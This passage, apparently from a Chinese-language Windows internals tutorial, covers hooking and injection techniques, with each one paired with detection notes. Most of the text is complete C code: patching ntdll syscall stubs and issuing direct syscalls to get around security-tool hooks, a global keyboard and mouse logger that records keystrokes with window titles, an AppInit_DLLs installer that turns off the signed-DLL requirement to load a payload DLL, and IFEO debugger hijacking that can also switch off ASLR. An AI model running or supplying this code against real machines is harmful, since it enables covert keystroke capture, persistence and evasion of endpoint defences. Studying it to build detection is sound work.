.Callback = pCallback\n    };\n\n    NTSTATUS status = NtSetInformationProcess(\n        GetCurrentProcess(),\n        ProcessInstrumentationCallback,\n        &amp;info,\nsizeof(info)\n    );\n\nreturn NT_SUCCESS(status);\n}\n\n// 移除 Instrumentation Callback\nBOOL RemoveInstrumentationCallback() {\n    fnNtSetInformationProcess NtSetInformationProcess = \n        (fnNtSetInformationProcess)GetProcAddress(\n            GetModuleHandleA(\"ntdll.dll\"), \"NtSetInformationProcess\");\n\n    PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION info = {\n        .Version = 0,\n        .Reserved = 0,\n        .Callback = NULL  // 设为 NULL 即可移除\n    };\n\n    NTSTATUS status = NtSetInformationProcess(\n        GetCurrentProcess(),\n        ProcessInstrumentationCallback,\n        &amp;info,\nsizeof(info)\n    );\n\nreturn NT_SUCCESS(status);\n}\n</code></pre><h3 id=\"section-61\">检测难度：★★★☆☆</h3><ul><li><p>不修改任何函数代码</p></li><li><p>但可以通过 NtQueryInformationProcess 查询是否设置了 Instrumentation Callback</p></li><li><p>内核中 EPROCESS.InstrumentationCallback 字段直接可读</p></li><li><p>某些反作弊直接清零该字段</p></li></ul><h3 id=\"section-62\">优点</h3><ul><li><p>一次设置，拦截所有系统调用返回</p></li><li><p>不需要知道具体函数地址</p></li><li><p>纯用户态操作，不需要内核驱动</p></li></ul><h3 id=\"section-63\">局限</h3><ul><li>只能在 syscall 返回路径上拦截，无法拦截普通函数调用</li><li>防递归处理很关键（回调内的 syscall 会再次触发回调）</li><li>需要 <code>SeDebugPrivilege</code> 来设置<strong>其他进程</strong>的回调</li><li>Callback 入口必须是汇编实现（需保存全部寄存器、遵守调用约定）</li></ul><hr><h2 id=\"section-64\">1.9 Syscall Hook（用户态直接系统调用劫持）</h2><h3 id=\"section-65\">技术定位</h3><p><strong>现代对抗核心</strong>。随着直接 syscall（Hell's Gate / Halo's Gate / SysWhispers）普及，仅 Hook ntdll 导出函数已不够，需理解 syscall stub 结构与 SSN 动态解析。本节同时涵盖 Hook 方与绕过方。</p><h3 id=\"section-66\">原理</h3><p>现代安全软件/反作弊会直接从 <code>ntdll.dll</code> 中读取 syscall 编号（SSN），绕过所有用户态 Hook 直接执行 <code>syscall</code> 指令。对抗方式是修改 ntdll 的 syscall stub 中的 SSN 或 <code>syscall</code> 指令本身。</p><p><strong>ntdll 标准 syscall stub（x64）</strong>：</p><pre><code class=\"language-text\">4C 8B D1                mov r10, rcx\nB8 XX 00 00 00          mov eax, SSN        ; ← 方案1：改这里\nF6 04 25 08 03 FE 7F 01 test [SharedUserData+0x308], 1\n75 03                   jne +3\n0F 05                   syscall             ; ← 方案2/3：改这里\nC3                      ret\n</code></pre><pre data-note-kind=\"mermaid\"><code>flowchart TB\n    subgraph 攻击方绕过用户态Hook\n        A1[\"从磁盘映射干净 ntdll\"] --&gt; A2[\"提取 SSN\"]\n        A2 --&gt; A3[\"自实现 syscall 汇编\"]\n        A3 --&gt; A4[\"直接进内核，绕过 Hook\"]\n    end\n    subgraph 防守方对抗直接syscall\n        B1[\"Hook ntdll stub\"] --&gt; B2[\"修改 SSN\"]\n        B1 --&gt; B3[\"Inline Hook syscall 指令\"]\n        B4[\"内核回调/ETW\"] --&gt; B5[\"监控异常 syscall 来源\"]\n    end\n</code></pre><h3 id=\"section-67\">Hell's Gate / Halo's Gate 简要说明</h3><p>当 ntdll 被 Hook 后，<code>mov eax, SSN</code> 可能被篡改。开源技术通过<strong>相邻未 Hook 的 syscall 函数推算 SSN</strong>：</p><table><thead><tr><th>技术</th><th>思路</th></tr></thead><tbody><tr><td><strong>Hell's Gate</strong></td><td>在 ntdll 中搜索目标函数 stub，直接读取 SSN</td></tr><tr><td><strong>Halo's Gate</strong></td><td>若目标被 Hook（stub 头被改），找上下相邻函数的 SSN ± 偏移推算</td></tr><tr><td><strong>SysWhispers</strong></td><td>编译期生成 syscall 汇编桩，运行时不需要解析 ntdll</td></tr></tbody></table><h3 id=\"section-68\">完整实现（含多种绕过方案）</h3><pre><code class=\"language-c\">#include &lt;windows.h&gt;\n\n// ntdll 中标准的 syscall stub (x64):\n// 4C 8B D1          mov r10, rcx\n// B8 XX 00 00 00    mov eax, SSN\n// F6 04 25 08 03 FE 7F 01   test byte ptr [SharedUserData+0x308], 1\n// 75 03             jne +3 (使用 int 2e)\n// 0F 05             syscall\n// C3                ret\n// CD 2E             int 2e\n// C3                ret\n\n// 方案 1：修改 SSN（让调用者不知情地调用另一个 syscall）\nBOOL PatchSsn(const char* funcName, DWORD newSsn) {\n    HMODULE hNtdll = GetModuleHandleA(\"ntdll.dll\");\n    BYTE* pStub = (BYTE*)GetProcAddress(hNtdll, funcName);\nif (!pStub) return FALSE;\n\n// 验证 stub 结构\nif (pStub[0] != 0x4C || pStub[1] != 0x8B || pStub[2] != 0xD1 || pStub[3] != 0xB8)\nreturn FALSE;\n\n// pStub[4..7] 是 SSN\n    DWORD oldProtect;\n    VirtualProtect(pStub + 4, 4, PAGE_EXECUTE_READWRITE, &amp;oldProtect);\n    *(DWORD*)(pStub + 4) = newSsn;\n    VirtualProtect(pStub + 4, 4, oldProtect, &amp;oldProtect);\nreturn TRUE;\n}\n\n// 方案 2：替换 syscall 为 int 2e（触发不同的内核入口，可被内核 Hook 拦截）\nBOOL PatchSyscallToInt2e(const char* funcName) {\n    HMODULE hNtdll = GetModuleHandleA(\"ntdll.dll\");\n    BYTE* pStub = (BYTE*)GetProcAddress(hNtdll, funcName);\nif (!pStub) return FALSE;\n\n// 找到 syscall 指令 (0F 05)\nfor (int i = 0; i &lt; 32; i++) {\nif (pStub[i] == 0x0F &amp;&amp; pStub[i+1] == 0x05) {\n            DWORD oldProtect;\n            VirtualProtect(pStub + i, 2, PAGE_EXECUTE_READWRITE, &amp;oldProtect);\n            pStub[i] = 0xCD;     // int\n            pStub[i+1] = 0x2E;   // 0x2E\n            VirtualProtect(pStub + i, 2, oldProtect, &amp;oldProtect);\nreturn TRUE;\n        }\n    }\nreturn FALSE;\n}\n\n// 方案 3：完整替换 syscall stub 为自定义跳转\nBOOL PatchSyscallStub(const char* funcName, PVOID hookFunc) {\n    HMODULE hNtdll = GetModuleHandleA(\"ntdll.dll\");\n    BYTE* pStub = (BYTE*)GetProcAddress(hNtdll, funcName);\nif (!pStub) return FALSE;\n\n// 将整个 stub 替换为跳转到我们的函数\n// 原始 stub 约 20 字节，足够放一个 14 字节绝对跳转\n    DWORD oldProtect;\n    VirtualProtect(pStub, 14, PAGE_EXECUTE_READWRITE, &amp;oldProtect);\n\n    pStub[0] = 0xFF;\n    pStub[1] = 0x25;\n    *(DWORD*)(pStub + 2) = 0;\n    *(UINT64*)(pStub + 6) = (UINT64)hookFunc;\n\n    VirtualProtect(pStub, 14, oldProtect, &amp;oldProtect);\nreturn TRUE;\n}\n\n// 方案 4：Syscall 重映射（将 ntdll 从磁盘重新映射一份干净副本）\n// 用于对抗：检测 ntdll 是否被修改\nHMODULE RemapCleanNtdll() {\n// 从磁盘读取干净的 ntdll\n    HANDLE hFile = CreateFileW(L\"C:\\\\Windows\\\\System32\\\\ntdll.dll\", \n        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);\nif (hFile == INVALID_HANDLE_VALUE) return NULL;\n\n    HANDLE hMapping = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);\n    PVOID pClean = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);\n\n    CloseHandle(hMapping);\n    CloseHandle(hFile);\n\n// 现在 pClean 是一份干净的 ntdll 映射\n// 可以从这里获取真实的 syscall 编号\nreturn (HMODULE)pClean;\n}\n\n// 从干净 ntdll 提取 SSN（用于直接 syscall）\nDWORD GetCleanSsn(HMODULE hCleanNtdll, const char* funcName) {\n    BYTE* pFunc = (BYTE*)GetProcAddress(hCleanNtdll, funcName);\nif (!pFunc) return -1;\nif (pFunc[0] == 0x4C &amp;&amp; pFunc[3] == 0xB8) {\nreturn *(DWORD*)(pFunc + 4);\n    }\nreturn -1;\n}\n</code></pre><h3 id=\"section-69\">检测难度：★★☆☆☆</h3><p>直接读取 ntdll 的 .text 段对比磁盘文件即可发现修改。</p><h3 id=\"section-70\">关键对抗</h3><p>现代反作弊（如 EAC、BattlEye）与 EDR 的常见做法：</p><ol><li>从磁盘重新映射一份干净 ntdll</li><li>直接从干净副本中提取 SSN（Halo's Gate 等）</li><li>用自己的 syscall 汇编直接调用内核，完全绕过被 Hook 的 ntdll</li><li>内核层监控 syscall 来源（异常返回地址不在 ntdll 范围内）</li></ol><h3 id=\"section-71\">直接 syscall 最小示例（理解绕过逻辑）</h3><pre><code class=\"language-c\">// 从干净 ntdll 获取 SSN 后，用汇编直接 syscall（概念示例）\n// NTSTATUS NtAllocateVirtualMemory(...) SSN 因 Windows 版本而异\n\n__declspec(naked) NTSTATUS DirectSyscall_NtAllocateVirtualMemory(\n    HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,\n    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)\n{\n    __asm {\n        mov r10, rcx\n        mov eax, 0x18        ; 示例 SSN，实际需动态获取\n        syscall\n        ret\n    }\n}\n</code></pre><blockquote><p><strong>注意</strong>：SSN 随 Windows 版本变化，必须使用 Hell's Gate / SysWhispers 等动态获取，不可硬编码。</p></blockquote><hr><h2 id=\"section-72\">1.10 SetWindowsHookEx（Windows 消息钩子）</h2><h3 id=\"section-73\">技术定位</h3><p><strong>仍广泛使用</strong>。Windows 官方消息钩子 API，低级钩子（<code>WH_KEYBOARD_LL</code> / <code>WH_MOUSE_LL</code>）不需要 DLL 注入，但需要消息循环；全局钩子会将 DLL 注入到目标进程。</p><h3 id=\"section-74\">原理</h3><p>Windows 消息机制提供了全局钩子接口 <code>SetWindowsHookEx</code>，可以拦截系统范围内的键盘、鼠标、窗口消息等事件。设置全局钩子时，系统会将指定的 DLL 注入到所有拥有消息循环的进程中，这使它成为最经典的 DLL 注入 + 行为监控手段。</p><p><strong>常用钩子类型</strong>：</p><table><thead><tr><th>类型</th><th>值</th><th>是否注入 DLL</th><th>典型用途</th></tr></thead><tbody><tr><td><code>WH_KEYBOARD_LL</code></td><td>13</td><td>否（同进程）</td><td>全局键盘监控</td></tr><tr><td><code>WH_MOUSE_LL</code></td><td>14</td><td>否（同进程）</td><td>全局鼠标监控</td></tr><tr><td><code>WH_GETMESSAGE</code></td><td>3</td><td>是</td><td>拦截消息队列</td></tr><tr><td><code>WH_CALLWNDPROC</code></td><td>4</td><td>是</td><td>监控窗口过程</td></tr><tr><td><code>WH_CBT</code></td><td>5</td><td>是</td><td>窗口创建/激活</td></tr></tbody></table><h3 id=\"section-75\">完整实现</h3><pre><code class=\"language-c\">#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n\n#pragma comment(lib, \"user32.lib\")\n\ntypedef struct {\n    HHOOK hKeyboard;\n    HHOOK hMouse;\n    HHOOK hCbt;\n    FILE* logFile;\n    BOOL running;\n} HOOK_ENGINE;\n\nstatic HOOK_ENGINE g_engine = {0};\n\nLRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {\nif (nCode == HC_ACTION) {\n        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;\nconstchar* action = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) ? \"DOWN\" : \"UP\";\n\nchar keyName[64] = {0};\nGetKeyNameTextA((LONG)(MapVirtualKeyA(kb-&gt;vkCode, MAPVK_VK_TO_VSC) &lt;&lt; 16), keyName, sizeof(keyName));\n\n        DWORD pid = 0;\n        HWND fg = GetForegroundWindow();\nGetWindowThreadProcessId(fg, &amp;pid);\n\nchar windowTitle[256] = {0};\nGetWindowTextA(fg, windowTitle, sizeof(windowTitle));\n\nfprintf(g_engine.logFile, \"[%s] VK=0x%02X Scan=0x%02X Key=%s PID=%lu Window=%s flags=0x%08X\\n\",\n            action, kb-&gt;vkCode, kb-&gt;scanCode, keyName, pid, windowTitle, kb-&gt;flags);\nfflush(g_engine.logFile);\n\nif (kb-&gt;flags &amp; LLKHF_INJECTED) {\n// 标记注入的键盘事件（来自 SendInput/keybd_event）\n        }\n    }\nreturn CallNextHookEx(g_engine.hKeyboard, nCode, wParam, lParam);\n}\n\nLRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {\nif (nCode == HC_ACTION) {\n        MSLLHOOKSTRUCT* ms = (MSLLHOOKSTRUCT*)lParam;\n\nconstchar* event = \"UNKNOWN\";\nswitch (wParam) {\ncase WM_LBUTTONDOWN: event = \"LDOWN\"; break;\ncase WM_LBUTTONUP:   event = \"LUP\"; break;\ncase WM_RBUTTONDOWN: event = \"RDOWN\"; break;\ncase WM_RBUTTONUP:   event = \"RUP\"; break;\ncase WM_MOUSEMOVE:   return CallNextHookEx(g_engine.hMouse, nCode, wParam, lParam);\ncase WM_MOUSEWHEEL:  event = \"WHEEL\"; break;\n        }\n\n        HWND target = WindowFromPoint(ms-&gt;pt);\nchar className[128] = {0};\nGetClassNameA(target, className, sizeof(className));\n\nfprintf(g_engine.logFile, \"[MOUSE] %s (%d,%d) Target=%s flags=0x%08X\\n\",\n            event, ms-&gt;pt.x, ms-&gt;pt.y, className, ms-&gt;flags);\nfflush(g_engine.logFile);\n    }\nreturn CallNextHookEx(g_engine.hMouse, nCode, wParam, lParam);\n}\n\nLRESULT CALLBACK CbtProc(int nCode, WPARAM wParam, LPARAM lParam) {\nswitch (nCode) {\ncase HCBT_CREATEWND: {\n            CBT_CREATEWNDA* cbt = (CBT_CREATEWNDA*)lParam;\nif (cbt-&gt;lpcs-&gt;lpszName) {\nfprintf(g_engine.logFile, \"[CBT] CREATE hwnd=%p class=%s title=%s\\n\",\n                    (void*)(ULONG_PTR)wParam,\n                    cbt-&gt;lpcs-&gt;lpszClass ? (constchar*)cbt-&gt;lpcs-&gt;lpszClass : \"?\",\n                    cbt-&gt;lpcs-&gt;lpszName ? cbt-&gt;lpcs-&gt;lpszName : \"?\");\n            }\nbreak;\n        }\ncase HCBT_DESTROYWND:\nfprintf(g_engine.logFile, \"[CBT] DESTROY hwnd=%p\\n\", (void*)(ULONG_PTR)wParam);\nbreak;\ncase HCBT_ACTIVATE:\nfprintf(g_engine.logFile, \"[CBT] ACTIVATE hwnd=%p\\n\", (void*)(ULONG_PTR)wParam);\nbreak;\n    }\nfflush(g_engine.logFile);\nreturn CallNextHookEx(g_engine.hCbt, nCode, wParam, lParam);\n}\n\nBOOL InstallGlobalHooks() {\n    g_engine.logFile = fopen(\"C:\\\\hook_log.txt\", \"a\");\nif (!g_engine.logFile) return FALSE;\n\n    g_engine.hKeyboard = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandleA(NULL), 0);\n    g_engine.hMouse = SetWindowsHookExA(WH_MOUSE_LL, LowLevelMouseProc, GetModuleHandleA(NULL), 0);\n    g_engine.hCbt = SetWindowsHookExA(WH_CBT, CbtProc, GetModuleHandleA(NULL), 0);\n\nif (!g_engine.hKeyboard &amp;&amp; !g_engine.hMouse &amp;&amp; !g_engine.hCbt) {\nfclose(g_engine.logFile);\nreturn FALSE;\n    }\n\n    g_engine.running = TRUE;\nreturn TRUE;\n}\n\nvoid UninstallGlobalHooks() {\nif (g_engine.hKeyboard) { UnhookWindowsHookEx(g_engine.hKeyboard); g_engine.hKeyboard = NULL; }\nif (g_engine.hMouse)    { UnhookWindowsHookEx(g_engine.hMouse);    g_engine.hMouse = NULL; }\nif (g_engine.hCbt)      { UnhookWindowsHookEx(g_engine.hCbt);      g_engine.hCbt = NULL; }\nif (g_engine.logFile)   { fclose(g_engine.logFile); g_engine.logFile = NULL; }\n    g_engine.running = FALSE;\n}\n\n// 全局钩子 DLL 版本（注入到目标进程）\n// hookdll.c - 编译为 hookdll.dll\n#ifdef BUILD_HOOK_DLL\n\n#pragma data_seg(\".shared\")\nHHOOK g_hHook = NULL;\n#pragma data_seg()\n#pragma comment(linker, \"/SECTION:.shared,RWS\")\n\nHINSTANCE g_hInst = NULL;\n\nLRESULT CALLBACK GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam) {\nif (nCode == HC_ACTION) {\n        MSG* msg = (MSG*)lParam;\n// DLL 已注入目标进程，可以在此执行任意代码\n// 例如：Hook 目标进程的 API、读取内存、修改行为等\n    }\nreturn CallNextHookEx(g_hHook, nCode, wParam, lParam);\n}\n\n__declspec(dllexport) BOOL StartHook() {\n    g_hHook = SetWindowsHookExA(WH_GETMESSAGE, GetMsgProc, g_hInst, 0);\nreturn g_hHook != NULL;\n}\n\n__declspec(dllexport) void StopHook() {\nif (g_hHook) { UnhookWindowsHookEx(g_hHook); g_hHook = NULL; }\n}\n\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {\nif (reason == DLL_PROCESS_ATTACH) {\n        g_hInst = hModule;\nDisableThreadLibraryCalls(hModule);\n    }\nreturn TRUE;\n}\n#endif\n\nint main() {\nif (!InstallGlobalHooks()) {\nprintf(\"Failed to install hooks\\n\");\nreturn 1;\n    }\nprintf(\"Global hooks installed. Press Ctrl+C to exit.\\n\");\n\n    MSG msg;\nwhile (GetMessageA(&amp;msg, NULL, 0, 0)) {\nTranslateMessage(&amp;msg);\nDispatchMessageA(&amp;msg);\n    }\n\nUninstallGlobalHooks();\nreturn 0;\n}\n</code></pre><h3 id=\"section-76\">检测方法</h3><ul><li><code>GetWindowsHookEx</code> 无法直接枚举他人钩子，但可通过钩子 DLL 模块扫描</li><li>检查进程中是否加载了非预期的 DLL</li><li>监控 <code>SetWindowsHookEx</code> 调用（API Monitor 或 ETW）</li><li>低级钩子（<code>WH_KEYBOARD_LL</code>/<code>WH_MOUSE_LL</code>）不注入 DLL，但需要消息循环保持活跃</li></ul><hr><h2 id=\"section-77\">1.11 AppInit_DLLs（注册表全局注入）</h2><h3 id=\"section-78\">技术定位</h3><p><strong>已基本禁用</strong>，仅作历史学习。通过注册表让所有加载 <code>user32.dll</code> 的进程自动加载指定 DLL。Win10 + Secure Boot 环境下几乎不可行。</p><h3 id=\"section-79\">原理</h3><p>Windows 在加载 <code>user32.dll</code> 时会检查注册表 <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs</code>，如果该键非空，则将指定的 DLL 加载到每个使用 <code>user32.dll</code> 的进程中。这是最古老的全局注入手段之一。</p><p><strong>启用条件（缺一不可）</strong>：</p><table><thead><tr><th>注册表项</th><th>值</th><th>说明</th></tr></thead><tbody><tr><td><code>AppInit_DLLs</code></td><td>DLL 路径（空格分隔）</td><td>要注入的 DLL 列表</td></tr><tr><td><code>LoadAppInit_DLLs</code></td><td>1</td><td>Win8+ 必须显式启用</td></tr><tr><td><code>RequireSignedAppInit_DLLs</code></td><td>0 或 1</td><td>Win10 Secure Boot 下必须为签名 DLL</td></tr></tbody></table><blockquote><p>Win8+ 需要额外设置 <code>LoadAppInit_DLLs = 1</code>，Win10 Secure Boot 模式下被彻底禁用（<code>RequireSignedAppInit_DLLs</code>）。</p></blockquote><h3 id=\"section-80\">完整实现</h3><pre><code class=\"language-c\">#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;shlwapi.h&gt;\n\n#pragma comment(lib, \"advapi32.lib\")\n#pragma comment(lib, \"shlwapi.lib\")\n\n#define APPINIT_KEY L\"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows\"\n#define APPINIT_KEY_WOW64 L\"SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows\"\n\ntypedef struct {\n    WCHAR dllPath[MAX_PATH];\nBOOL is64bit;\nBOOL requireSigned;\n} APPINIT_CONFIG;\n\nBOOL EnableAppInitDlls(const WCHAR* dllPath, BOOL enable) {\n    HKEY hKey;\n    LPCWSTR keyPath = APPINIT_KEY;\n\n    LONG ret = RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_SET_VALUE | KEY_QUERY_VALUE, &amp;hKey);\nif (ret != ERROR_SUCCESS) return FALSE;\n\nif (enable) {\n// 设置 LoadAppInit_DLLs = 1\n        DWORD loadFlag = 1;\n        RegSetValueExW(hKey, L\"LoadAppInit_DLLs\", 0, REG_DWORD, (BYTE*)&amp;loadFlag, sizeof(DWORD));\n\n// 读取现有值，追加新 DLL 路径\n        WCHAR existing[4096] = {0};\n        DWORD existingSize = sizeof(existing);\n        RegQueryValueExW(hKey, L\"AppInit_DLLs\", NULL, NULL, (BYTE*)existing, &amp;existingSize);\n\nif (wcsstr(existing, dllPath) == NULL) {\nif (wcslen(existing) &gt; 0) wcscat_s(existing, 4096, L\" \");\n            wcscat_s(existing, 4096, dllPath);\n        }\n\n        RegSetValueExW(hKey, L\"AppInit_DLLs\", 0, REG_SZ, (BYTE*)existing, (DWORD)((wcslen(existing) + 1) * sizeof(WCHAR)));\n\n// 禁用签名要求（仅测试环境）\n        DWORD signFlag = 0;\n        RegSetValueExW(hKey, L\"RequireSignedAppInit_DLLs\", 0, REG_DWORD, (BYTE*)&amp;signFlag, sizeof(DWORD));\n    } else {\n// 从现有值中移除指定 DLL\n        WCHAR existing[4096] = {0};\n        DWORD existingSize = sizeof(existing);\n        RegQueryValueExW(hKey, L\"AppInit_DLLs\", NULL, NULL, (BYTE*)existing, &amp;existingSize);\n\n        WCHAR* found = wcsstr(existing, dllPath);\nif (found) {\n            size_t dllLen = wcslen(dllPath);\n// 移除路径和前后的空格\n            WCHAR* afterDll = found + dllLen;\nif (*afterDll == L' ') afterDll++;\n            wmemmove(found, afterDll, wcslen(afterDll) + 1);\n// 清理尾部空格\n            size_t len = wcslen(existing);\nwhile (len &gt; 0 &amp;&amp; existing[len-1] == L' ') existing[--len] = L'\\0';\n        }\n\n        RegSetValueExW(hKey, L\"AppInit_DLLs\", 0, REG_SZ, (BYTE*)existing, (DWORD)((wcslen(existing) + 1) * sizeof(WCHAR)));\n\nif (wcslen(existing) == 0) {\n            DWORD loadFlag = 0;\n            RegSetValueExW(hKey, L\"LoadAppInit_DLLs\", 0, REG_DWORD, (BYTE*)&amp;loadFlag, sizeof(DWORD));\n        }\n    }\n\n    RegCloseKey(hKey);\nreturn TRUE;\n}\n\n// 被注入的 DLL 代码\n#ifdef BUILD_PAYLOAD_DLL\n#include &lt;tlhelp32.h&gt;\n\nstatic BOOL g_initialized = FALSE;\nstatic CHAR g_targetProcess[MAX_PATH] = \"target.exe\";\n\nvoid PayloadMain() {\nchar currentExe[MAX_PATH];\n    GetModuleFileNameA(NULL, currentExe, MAX_PATH);\nchar* exeName = strrchr(currentExe, '\\\\');\n    exeName = exeName ? exeName + 1 : currentExe;\n\nif (_stricmp(exeName, g_targetProcess) != 0) return;\n\n// 仅在目标进程中执行 payload\n// 示例：IAT Hook + 行为修改\n    HMODULE hKernel32 = GetModuleHandleA(\"kernel32.dll\");\n// ... 执行具体 Hook 逻辑\n}\n\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {\nswitch (reason) {\ncase DLL_PROCESS_ATTACH:\n            DisableThreadLibraryCalls(hModule);\nif (!g_initialized) {\n                g_initialized = TRUE;\n                PayloadMain();\n            }\nbreak;\n    }\nreturn TRUE;\n}\n#endif\n\n// 安装器\nint wmain(int argc, WCHAR* argv[]) {\nif (argc &lt; 3) {\n        wprintf(L\"Usage: appinit_installer.exe &lt;install|uninstall&gt; &lt;dll_path&gt;\\n\");\nreturn 1;\n    }\n\nBOOL install = (_wcsicmp(argv[1], L\"install\") == 0);\n\nif (!PathFileExistsW(argv[2]) &amp;&amp; install) {\n        wprintf(L\"DLL not found: %s\\n\", argv[2]);\nreturn 1;\n    }\n\nif (EnableAppInitDlls(argv[2], install)) {\n        wprintf(L\"%s successful: %s\\n\", install ? L\"Install\" : L\"Uninstall\", argv[2]);\n\n// 同时处理 WOW64 路径（32位进程在64位系统上）\nBOOL isWow64 = FALSE;\n        IsWow64Process(GetCurrentProcess(), &amp;isWow64);\nif (!isWow64) {\n            HKEY hKey;\nif (RegOpenKeyExW(HKEY_LOCAL_MACHINE, APPINIT_KEY_WOW64, 0, KEY_SET_VALUE, &amp;hKey) == ERROR_SUCCESS) {\n                DWORD loadFlag = install ? 1 : 0;\n                RegSetValueExW(hKey, L\"LoadAppInit_DLLs\", 0, REG_DWORD, (BYTE*)&amp;loadFlag, sizeof(DWORD));\n                RegCloseKey(hKey);\n                wprintf(L\"WOW64 key also updated\\n\");\n            }\n        }\n    } else {\n        wprintf(L\"Failed (need administrator privileges)\\n\");\nreturn 1;\n    }\n\nreturn 0;\n}\n</code></pre><h3 id=\"section-81\">检测方法</h3><ul><li><p>监控注册表键 AppInit_DLLs 和 LoadAppInit_DLLs 的变更</p></li><li><p>启用 Secure Boot + RequireSignedAppInit_DLLs 彻底阻止</p></li><li><p>Process Monitor 观察 user32.dll 加载时的注册表查询</p></li></ul><h3 id=\"section-82\">检测方法</h3><ul><li>监控注册表键 <code>AppInit_DLLs</code> 和 <code>LoadAppInit_DLLs</code> 的变更</li><li>启用 Secure Boot + <code>RequireSignedAppInit_DLLs</code> 彻底阻止</li><li>Process Monitor 观察 <code>user32.dll</code> 加载时的注册表查询</li></ul><hr><h2 id=\"section-83\">1.12 IFEO（映像劫持 / 调试器重定向）</h2><h3 id=\"section-84\">技术定位</h3><p><strong>合法调试功能，常被滥用</strong>。通过 IFEO 注册表在目标程序启动时自动运行\"调试器\"（实际为注入器）。无需修改目标二进制，重启后生效。</p><h3 id=\"section-85\">原理</h3><p>Image File Execution Options（映像文件执行选项）是 Windows 提供的调试辅助功能。通过在注册表 <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\&lt;exe&gt;</code> 下设置 <code>Debugger</code> 值，可以让系统在启动指定程序时自动启动另一个程序（原程序路径作为参数传入）。</p><p>高级用法还包括 <code>GlobalFlag</code>（启用页堆等调试功能）和 <code>VerifierDlls</code>（Application Verifier 注入自定义 DLL）。</p><pre data-note-kind=\"mermaid\"><code>flowchart LR\n    A[\"用户启动 notepad.exe\"] --&gt; B[\"系统检查 IFEO 注册表\"]\n    B --&gt; C{\"存在 Debugger 值?\"}\n    C --&gt;|是| D[\"启动 debugger_proxy.exe&lt;br/&gt;参数: notepad.exe 路径\"]\n    C --&gt;|否| E[\"正常启动 notepad.exe\"]\n    D --&gt; F[\"代理程序注入 DLL&lt;br/&gt;再启动真正的 notepad\"]\n</code></pre><h3 id=\"section-86\">完整实现</h3><pre><code class=\"language-c\">#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n\n#pragma comment(lib, \"advapi32.lib\")\n\n#define IFEO_BASE L\"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\"\n\ntypedef enum {\n    IFEO_DEBUGGER,        // 经典 Debugger 重定向\n    IFEO_VERIFIER,        // Application Verifier DLL 注入\n    IFEO_GLOBALFLAG,      // 全局标志（页堆、栈回溯等）\n    IFEO_MITIGATION,      // 进程缓解策略修改\n    IFEO_SILENT_EXIT      // 静默退出监控（WerFault 劫持）\n} IFEO_METHOD;\n\nBOOL InstallIfeo(const WCHAR* targetExe, const WCHAR* payload, IFEO_METHOD method) {\n    WCHAR keyPath[512];\n    swprintf_s(keyPath, 512, L\"%s\\\\%s\", IFEO_BASE, targetExe);\n\n    HKEY hKey;\n    DWORD disposition;\n    LONG ret = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, NULL, 0, KEY_SET_VALUE, NULL, &amp;hKey, &amp;disposition);\nif (ret != ERROR_SUCCESS) return FALSE;\n\nBOOL result = FALSE;\n\nswitch (method) {\ncase IFEO_DEBUGGER: {\n// 方法1：经典 Debugger 劫持\n// 当系统启动 targetExe 时，实际启动的是 payload，targetExe 作为参数\n            result = (RegSetValueExW(hKey, L\"Debugger\", 0, REG_SZ, \n                (BYTE*)payload, (DWORD)((wcslen(payload) + 1) * sizeof(WCHAR))) == ERROR_SUCCESS);\nbreak;\n        }\n\ncase IFEO_VERIFIER: {\n// 方法2：Application Verifier 注入\n// 设置 GlobalFlag 启用 verifier，指定自定义 verifier DLL\n            DWORD globalFlag = 0x100;  // FLG_APPLICATION_VERIFIER\n            RegSetValueExW(hKey, L\"GlobalFlag\", 0, REG_DWORD, (BYTE*)&amp;globalFlag, sizeof(DWORD));\n            result = (RegSetValueExW(hKey, L\"VerifierDlls\", 0, REG_SZ,\n                (BYTE*)payload, (DWORD)((wcslen(payload) + 1) * sizeof(WCHAR))) == ERROR_SUCCESS);\nbreak;\n        }\n\ncase IFEO_GLOBALFLAG: {\n// 方法3：启用页堆 + 栈回溯等调试功能\n            DWORD flags = 0x02000000 | 0x1000;  // FLG_HEAP_PAGE_ALLOCS | FLG_USER_STACK_TRACE_DB\n            result = (RegSetValueExW(hKey, L\"GlobalFlag\", 0, REG_DWORD, \n                (BYTE*)&amp;flags, sizeof(DWORD)) == ERROR_SUCCESS);\nbreak;\n        }\n\ncase IFEO_MITIGATION: {\n// 方法4：修改进程缓解策略\n// 例如禁用 CFG、禁用 ASLR 等（降低目标安全性后再攻击）\n            DWORD64 policy = 0;\n// PROCESS_CREATION_MITIGATION_POLICY_FORCE_RELOCATE_IMAGES_ALWAYS_OFF\n            policy |= (0x2ULL &lt;&lt; 8);\n// PROCESS_CREATION_MITIGATION_POLICY_BOTTOM_UP_ASLR_ALWAYS_OFF\n            policy |= (0x2ULL &lt;&lt; 16);\n\n            WCHAR mitigation[128];\n            swprintf_s(mitigation, 128, 